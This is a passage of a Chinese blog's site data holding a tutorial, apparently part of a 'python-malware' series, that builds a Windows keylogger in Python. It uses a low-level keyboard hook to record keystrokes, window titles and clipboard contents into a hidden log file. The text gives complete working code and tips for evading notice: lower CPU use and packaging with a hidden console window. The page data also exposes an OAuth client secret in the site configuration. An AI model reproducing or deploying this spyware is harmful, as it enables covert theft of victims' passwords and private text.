class=\"params\">(Structure)</span>:</span> _fields_=[</span><br><span class=\"line\">    (<span class=\"string\">'vkCode'</span>,DWORD),</span><br><span class=\"line\">    (<span class=\"string\">'scanCode'</span>,DWORD),</span><br><span class=\"line\">    (<span class=\"string\">'flags'</span>,DWORD),</span><br><span class=\"line\">    (<span class=\"string\">'time'</span>,DWORD),</span><br><span class=\"line\">    (<span class=\"string\">'dwExtraInfo'</span>,DWORD)]</span><br><span class=\"line\">`</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装钩子来监听键盘事件\"><a href=\"#安装钩子来监听键盘事件\" class=\"headerlink\" title=\"安装钩子来监听键盘事件\"></a>安装钩子来监听键盘事件</h3><p>创建一个名为<code>hook</code>的类，该类通过安装钩子来监听键盘事件。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">hook</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#用于安装/卸载钩子</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\">#调用user32.dll和kernel32.dll</span></span><br><span class=\"line\">        self.user32 = user32</span><br><span class=\"line\">        self.kernel32 = kernel32</span><br><span class=\"line\">        self.is_hooked = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">install_hook</span><span class=\"params\">(self, ptr)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\">#安装钩子</span></span><br><span class=\"line\">        self.is_hooked = self.user32.SetWindowsHookExA(</span><br><span class=\"line\">            WH_KEYBOARD_LL,</span><br><span class=\"line\">            ptr,</span><br><span class=\"line\">            kernel32.GetModuleHandleW(<span class=\"literal\">None</span>),</span><br><span class=\"line\">            <span class=\"number\">0</span></span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> self.is_hooked:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">uninstall_hook</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\">#卸载钩子</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.is_hooked <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        self.user32.UnhookWindowsHookEx(self.is_hooked)</span><br><span class=\"line\">        self.is_hooked = <span class=\"literal\">None</span></span><br></pre></td></tr></table></figure>\n\n<p><code>is_hooked</code>变量用于保存挂钩过程的句柄<code>SetWindowsHookExA</code>。<br><code>install_hook</code>方法用于安装钩子调用<code>SetWindowsHookExA</code><br><code>uninstall_hook</code>方法用于卸载钩子。测试键盘记录程序时使用</p>\n<h3 id=\"get-current-window-和get-clipboard\"><a href=\"#get-current-window-和get-clipboard\" class=\"headerlink\" title=\"get_current_window()和get_clipboard()\"></a>get_current_window()和get_clipboard()</h3><p>用到part1抓取窗口标题与剪贴板数据。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_current_window</span><span class=\"params\">()</span>:</span>    <span class=\"comment\">#抓取当前窗口标题</span></span><br><span class=\"line\">    <span class=\"comment\">#必需的WinAPI函数</span></span><br><span class=\"line\">    GetForegroundWindow = user32.GetForegroundWindow</span><br><span class=\"line\">    GetWindowTextLength = user32.GetWindowTextLengthW</span><br><span class=\"line\">    GetWindowText = user32.GetWindowTextW</span><br><span class=\"line\"></span><br><span class=\"line\">    hwnd = GetForegroundWindow()    <span class=\"comment\">#获取当前窗口句柄</span></span><br><span class=\"line\">    length = GetWindowTextLength(hwnd)    <span class=\"comment\">#获取标题文本长度，将句柄乍为参数传递</span></span><br><span class=\"line\">    buff = ctypes.create_unicode_buffer(length + <span class=\"number\">1</span>)    <span class=\"comment\">#创建临时缓存buff用于存储标题文本</span></span><br><span class=\"line\"></span><br><span class=\"line\">    GetWindowText(hwnd, buff, length + <span class=\"number\">1</span>)    <span class=\"comment\">#获取窗口标题并存储在buff中</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> buff.value    <span class=\"comment\">#返回buff的值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_clipboard</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    CF_TEXT = <span class=\"number\">1</span>    <span class=\"comment\">#设置剪贴板格式</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#GlobalLock/GlobalUnlock 参数与返回类型</span></span><br><span class=\"line\">    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]</span><br><span class=\"line\">    kernel32.GlobalLock.restype = ctypes.c_void_p</span><br><span class=\"line\">    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#GetClipboardData的返回类型</span></span><br><span class=\"line\">    user32.GetClipboardData.restype = ctypes.c_void_p</span><br><span class=\"line\">    user32.OpenClipboard(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#所需剪贴板函数</span></span><br><span class=\"line\">    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable</span><br><span class=\"line\">    GetClipboardData = user32.GetClipboardData</span><br><span class=\"line\">    CloseClipboard = user32.CloseClipboard</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> IsClipboardFormatAvailable(CF_TEXT):    <span class=\"comment\">#如果CF_TEXT可用</span></span><br><span class=\"line\">            data = GetClipboardData(CF_TEXT)    <span class=\"comment\">#获取剪贴板数据的句柄</span></span><br><span class=\"line\">            data_locked = kernel32.GlobalLock(data)    <span class=\"comment\">#获取指向数据所在的内存位置的指针</span></span><br><span class=\"line\">            text = ctypes.c_char_p(data_locked)    <span class=\"comment\">#获取指向data_locked位置的char*(python中的字符串)指针</span></span><br><span class=\"line\">            value = text.value    <span class=\"comment\">#存储有用的值</span></span><br><span class=\"line\">            kernel32.GlobalUnlock(data_locked)    <span class=\"comment\">#递减锁计数</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> value.decode(<span class=\"string\">'utf-8'</span>)    <span class=\"comment\">#返回剪贴板的值</span></span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        CloseClipboard()    <span class=\"comment\">#关闭剪贴板</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"键盘事件发生调用的钩子程序\"><a href=\"#键盘事件发生调用的钩子程序\" class=\"headerlink\" title=\"键盘事件发生调用的钩子程序\"></a>键盘事件发生调用的钩子程序</h3><p>声明全局变量，这样每次点击按键时被清空。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hook_procedure</span><span class=\"params\">(nCode, wParam, lParam)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">global</span> last_key</span><br><span class=\"line\">    <span class=\"keyword\">global</span> current_clipboard</span><br><span class=\"line\">    <span class=\"keyword\">global</span> line</span><br><span class=\"line\">    <span class=\"keyword\">global</span> current_window</span><br></pre></td></tr></table></figure>\n\n<p>与part1同，我们需要知道用户键入时当前窗口，以便我们如果使用检索到的数据。每当按下特定键里，我们可以使用函数来卸载钩子(此处为<code>CONTROL</code>)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> current_window != get_current_window():    <span class=\"comment\">#判断current_window内容不是当前打开的窗口</span></span><br><span class=\"line\">    current_window = get_current_window()    <span class=\"comment\">#将窗口标题放在current_window中</span></span><br><span class=\"line\">    logging.info(<span class=\"string\">'[WINDOW] '</span> + current_window)    <span class=\"comment\">#将当前窗口标题写入日志文件</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#如果你在测试时想卸载钩子，请删除下面注释</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">if user32.GetKeyState(VIRTUAL_KEYS['CONTROL']) &amp; 0x8000:</span></span><br><span class=\"line\"><span class=\"string\">    hook.uninstall_hook()</span></span><br><span class=\"line\"><span class=\"string\">    return 0</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> nCode == HC_ACTION <span class=\"keyword\">and</span> wParam == WM_KEYDOWN:</span><br><span class=\"line\">    kb = KBDLLHOOKSTRUCT.from_address(lParam)</span><br><span class=\"line\">    user32.GetKeyState(VIRTUAL_KEYS[<span class=\"string\">'SHIFT'</span>])</span><br><span class=\"line\">    user32.GetKeyState(VIRTUAL_KEYS[<span class=\"string\">'MENU'</span>])</span><br><span class=\"line\">    state = (c_char * <span class=\"number\">256</span>)()</span><br><span class=\"line\">    user32.GetKeyboardState(byref(state))</span><br><span class=\"line\">    buff = create_unicode_buffer(<span class=\"number\">8</span>)</span><br><span class=\"line\">    n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, <span class=\"number\">8</span> - <span class=\"number\">1</span>, <span class=\"number\">0</span>)    <span class=\"comment\">#ToUnicode返回值：-1/一个死键,0/不进行任何转换,1/一个字符,&gt;=2/两个或多个字符</span></span><br><span class=\"line\">    key = wstring_at(buff)</span><br></pre></td></tr></table></figure>\n\n<p>这里的逻辑是，当按下一个键时，我们调用之前创建的类<code>from_address</code>来获取有关键盘事件的信息，并将其<code>kb</code>作为数据结构存储在变量中<code>KBDLLHOOKSTRUCT</code>。创建一个<code>state</code>大小为256的变量来保存所有256个虚拟键的状态。这里调用<code>GetKeyboardState()</code>函数来完成。然后我们声明一个<code>Buff</code>变量以创建Unicode字符缓冲区(具有wchar数据类型的值的数组)。我们使用<code>ToUnicode</code>函数将虚拟按键代码或键盘状态转换为Unicode字符，然后使用<code>wstring_at()</code>将字符存储为1个字符的Unicode字符串。</p>\n<p><code>ToUnicode</code>返回值存储在n中。每当按下一个键里钩子过程会存储一个返回值，我们可以使用它来确定是否记录字符。只要n大于0，我们就记录按下的键。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"keyword\">if</span> n &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> kb.vkCode <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> VIRTUAL_KEYS.values():    <span class=\"comment\">#如果键入非特殊键，则加入line变量</span></span><br><span class=\"line\">            line += key</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> key, value <span class=\"keyword\">in</span> VIRTUAL_KEYS.items():    <span class=\"comment\">#如果键入特殊键，则记录特殊键名</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> kb.vkCode == value:</span><br><span class=\"line\">                logging.info(key)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> kb.vkCode == VIRTUAL_KEYS[<span class=\"string\">'RETURN'</span>]:    <span class=\"comment\">#如果键入RETURN，则记录并清除line变量</span></span><br><span class=\"line\">            logging.info(line)</span><br><span class=\"line\">            line = <span class=\"string\">\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> current_clipboard != get_clipboard():    <span class=\"comment\">#如果剪贴板中有新数据，则记录该数据</span></span><br><span class=\"line\">            current_clipboard = get_clipboard()</span><br><span class=\"line\">            logging.info(<span class=\"string\">'[CLIPBOARD] '</span> + current_clipboard + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> user32.CallNextHookEx(hook.is_hooked, nCode, wParam, lParam)    <span class=\"comment\">#将钩子信息传递给下个钩子过程CallNextHookEx</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"last\"><a href=\"#last\" class=\"headerlink\" title=\"last\"></a>last</h3><p>创建<code>hook</code>类实例，创建指针<code>ptr</code>，安装钩子<code>install_hook(ptr)</code>，等待钩子截获系统信息。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hook = hook()</span><br><span class=\"line\">ptr = HOOKPROC(hook_procedure)</span><br><span class=\"line\">hook.install_hook(ptr)</span><br><span class=\"line\">msg = MSG()</span><br><span class=\"line\">user32.GetMessageA(byref(msg), <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<p>用pyinstaller将文件打包成exe，可以用参数-w/–noconsole来隐藏dos窗口</p>\n<p>解决part1的cpu占用率高问题，但未解决右键复制获取剪粘板数据。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/2_1.png\" alt=\"part2_1\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/2_2.png\" alt=\"part2_2\"></p>\n<p>源代码已上传致<a href=\"https://github.com/yui77111/python-malware/blob/master/keylogger/part2.py\" target=\"_blank\" rel=\"noopener\">gayhub</a></p>\n","site":{"data":{"melody":{"theme_color":{"enable":true,"main":"#2d2d46","paginator":"#9b87b4","button_hover":"#9b87b4","text_selection":"#eebb53","link_color":"#1e1f4a","hr_color":"#ffefbd","tag_start_color":"#ffefbd","tag_end_color":"#c5b1cf"},"menu":{"主站":"/","归档":"/archives","标签":"/tags","分类":"/categories"},"favicon":"/melody-favicon.ico","pwa":{"enable":false,"manifest":"/manifest.json"},"highlight_theme":"ocean","social":{"zhihu fab":"https://www.zhihu.com/people/undefinederror/activities","rss fas":"https://listener1379.site","github fab":"https://github.com/1379Post"},"algolia_search":{"enable":false,"hits":{"per_page":10}},"local_search":{"enable":true,"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}"}},"mathjax":{"enable":true,"cdn":"https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"},"katex":{"enable":false,"cdn":{"css":"https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"}},"fireworks":true,"baidu_analytics":"0535214fe33ef7df8b00f50266abfa7d","google_analytics":null,"tencent_analytics":null,"stylesheets":["/css/index.css"],"scripts":["/js/utils.js","/js/fancybox.js","/js/sidebar.js","/js/copy.js","/js/fireworks.js","/js/transition.js","/js/scroll.js","/js/head.js"],"cdn":{"css":{"fontawesome":"https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css","fontawesomeV5":"https://use.fontawesome.com/releases/v5.3.1/css/all.css"},"js":{"anime":"https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js","jquery":"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js","fancybox":"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js","velocity":"https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js","velocity-ui":"https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"}},"avatar":"https://s2.ax1x.com/2019/10/06/ugJeoR.png","top_img":"https://s2.ax1x.com/2019/10/06/ugJCWV.png","post_meta":{"date_type":"created","categories":true,"tags":true},"wordcount":{"enable":true},"toc":{"enable":true,"number":true},"post_copyright":{"enable":true,"license":"CC BY-NC-SA 4.0","license_url":"https://creativecommons.org/licenses/by-nc-sa/4.0/"},"slide":{"separator":"---","separator_vertical":"--","charset":"utf-8","theme":"black","mouseWheel":false,"transition":"slide","transitionSpeed":"default","parallaxBackgroundImage":"","parallaxBackgroundSize":"","parallaxBackgroundHorizontal":null,"parallaxBackgroundVertical":null},"QR_code":[{"itemlist":{"img":"https://i.loli.net/2019/10/10/5O8EnrXMHD4VFct.jpg","text":"支付宝打赏"}},{"itemlist":{"img":"https://i.loli.net/2019/10/10/1iYFIq2ODwrNLCU.png","text":"微信打赏"}}],"adv":{"enable":true,"info":"<div>  </div>"},"addThis":{"enable":false},"disqus":{"enable":false},"gitalk":{"enable":true,"client_id":"7eb42bfb73a159026f1b","client_secret":"3ebfe7728284d8d4c61ac3e789afb034ae2135e4","repo":"1379post.github.io","owner":"1379Post","admin":"1379Post"},"since":9102,"ICP":{"enable":false},"busuanzi":{"enable":true,"site_uv":true,"site_uv_header":"<i class=\"fa fa-user\"></i>","site_uv_footer":null,"site_pv":true,"site_pv_header":"<i class=\"fa fa-eye\"></i>","site_pv_footer":null,"page_pv":true,"page_pv_header":"<i class=\"fa fa-file-o\"></i>","page_pv_footer":null},"links_title":"Links","links":{"Luogu":"https://www.luogu.org","Github":"https://github.com","Zhihu":"https://www.zhihu.com"},"follow":{"enable":true,"url":"https://www.luogu.org/space/show?uid=155907","text":"See me on Luogu"},"google_adsense":{"enable":false,"js":"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js","client":"ca-pub-...........","enable_page_level_ads":true}}}},"excerpt":"","more":"<blockquote>\n<p>part1使用while True死循环来时时监听用户敲击使得cpu占用率较高，容易被察觉。而part2则使用当用户敲击时触发来解决，且part2使用了<code>SetWindowsHookExa</code>在基于事情方法的性能要优于part1使用的<code>GetAsncKeyState</code>。</p>\n</blockquote>\n<h3 id=\"加载库，初始化变量\"><a href=\"#加载库，初始化变量\" class=\"headerlink\" title=\"加载库，初始化变量\"></a>加载库，初始化变量</h3><p>加载 <code>user32.dll</code> 和<code>kernel32.dll</code>，设置日志记录并创建变量以保存文本，窗口标题和按下的键。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes.wintypes <span class=\"keyword\">import</span> DWORD, LPARAM, WPARAM, MSG</span><br><span class=\"line\"><span class=\"keyword\">import</span> logging</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">logging.basicConfig(filename=(os.environ[<span class=\"string\">'localappdata'</span>] +<span class=\"string\">\"\\\\\"</span> + <span class=\"string\">'applog.txt'</span>), level=logging.DEBUG, format=<span class=\"string\">'%(message)s'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#加载所需库</span></span><br><span class=\"line\">user32 = windll.user32</span><br><span class=\"line\">kernel32 = windll.kernel32</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">current_window = <span class=\"literal\">None</span>   <span class=\"comment\"># 窗口标题</span></span><br><span class=\"line\">current_clipboard = []  <span class=\"comment\"># 剪贴板内容</span></span><br><span class=\"line\">last_key = <span class=\"literal\">None</span>         <span class=\"comment\"># 最后一个按键</span></span><br><span class=\"line\">line = <span class=\"string\">\"\"</span>               <span class=\"comment\"># 点击的键盘字符行</span></span><br></pre></td></tr></table></figure>\n\n<p>我们要利用钩子函数<code>SetWindowsHookExa</code>，<code>UnhookWindowsHookEx</code>和<code>CallNextHookEx</code>还需要一个类用作数据结构，以保存来自KBDLLHOOKSTRUCT结构的键盘输入事件中的数据。<br>我们先声明一些常量，以后调用WinAPI函数时使用。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WH_KEYBOARD_LL = <span class=\"number\">13</span>     <span class=\"comment\"># 键盘钩子用于SetWindowsExa</span></span><br><span class=\"line\">WM_KEYDOWN = <span class=\"number\">0x0100</span></span><br><span class=\"line\">HC_ACTION = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p><code>SetWindowsHookExa</code>需要知道它必须设置什么类型的钩子，我们使用<code>WH_KEYBOARD_LL</code>( 用来对底层的键盘输入事件进行监视，<a href=\"https://docs.microsoft.com/zh-cn/windows/win32/winmsg/about-hooks?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\">详情参见</a>)因为它不需要在进程中注入DLL，较难捕获。<code>WM_KEYDOWN</code>告诉我们何时按下非系统键。<code>GC_ACTION</code>是传递给<code>KeyboardProc</code>回调函数的参数</p>\n<h3 id=\"使用虚拟键检测按下的特殊键\"><a href=\"#使用虚拟键检测按下的特殊键\" class=\"headerlink\" title=\"使用虚拟键检测按下的特殊键\"></a>使用虚拟键检测按下的特殊键</h3><p>将虚拟键映射到它们各自的十六进制值，并创建<code>HOOKPROC</code>回调函数。<a href=\"http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/\" target=\"_blank\" rel=\"noopener\">虚拟键值参考</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VIRTUAL_KEYS = &#123;<span class=\"string\">'RETURN'</span>: <span class=\"number\">0x0D</span>,</span><br><span class=\"line\">                <span class=\"string\">'CONTROL'</span>: <span class=\"number\">0x11</span>,</span><br><span class=\"line\">                <span class=\"string\">'SHIFT'</span>: <span class=\"number\">0x10</span>,</span><br><span class=\"line\">                <span class=\"string\">'MENU'</span>: <span class=\"number\">0x12</span>,</span><br><span class=\"line\">                <span class=\"string\">'TAB'</span>: <span class=\"number\">0x09</span>,</span><br><span class=\"line\">                <span class=\"string\">'BACKSPACE'</span>: <span class=\"number\">0x08</span>,</span><br><span class=\"line\">                <span class=\"string\">'CLEAR'</span>: <span class=\"number\">0x0C</span>,</span><br><span class=\"line\">                <span class=\"string\">'CAPSLOCK'</span>: <span class=\"number\">0x14</span>,</span><br><span class=\"line\">                <span class=\"string\">'ESCAPE'</span>: <span class=\"number\">0x1B</span>,</span><br><span class=\"line\">                <span class=\"string\">'HOME'</span>: <span class=\"number\">0x24</span>,</span><br><span class=\"line\">                <span class=\"string\">'INS'</span>: <span class=\"number\">0x2D</span>,</span><br><span class=\"line\">                <span class=\"string\">'DEL'</span>: <span class=\"number\">0x2E</span>,</span><br><span class=\"line\">                <span class=\"string\">'END'</span>: <span class=\"number\">0x23</span>,</span><br><span class=\"line\">                <span class=\"string\">'PRINTSCREEN'</span>: <span class=\"number\">0x2C</span>,</span><br><span class=\"line\">                <span class=\"string\">'CANCEL'</span>: <span class=\"number\">0x03</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM)</span><br></pre></td></tr></table></figure>\n\n<p>我们需要数据结构来保存有关键盘输入事件的信息。这里MSDN提供了结构，<a href=\"https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-kbdllhookstruct\" target=\"_blank\" rel=\"noopener\">参考</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">KBDLLHOOKSTRUCT</span><span class=\"params\">(Structure)</span>:</span> _fields_=[</span><br><span class=\"line\">    (<span class=\"string\">'vkCode'</span>,DWORD),</span><br><span class=\"line\">    (<span class=\"string\">'scanCode'</span>,DWORD),</span><br><span class=\"line\">    (<span class=\"string\">'flags'</span>,DWORD),</span><br><span class=\"line\">    (<span class=\"string\">'time'</span>,DWORD),</span><br><span class=\"line\">    (<span class=\"string\">'dwExtraInfo'</span>,DWORD)]</span><br><span class=\"line\">`</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装钩子来监听键盘事件\"><a href=\"#安装钩子来监听键盘事件\" class=\"headerlink\" title=\"安装钩子来监听键盘事件\"></a>安装钩子来监听键盘事件</h3><p>创建一个名为<code>hook</code>的类，该类通过安装钩子来监听键盘事件。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span 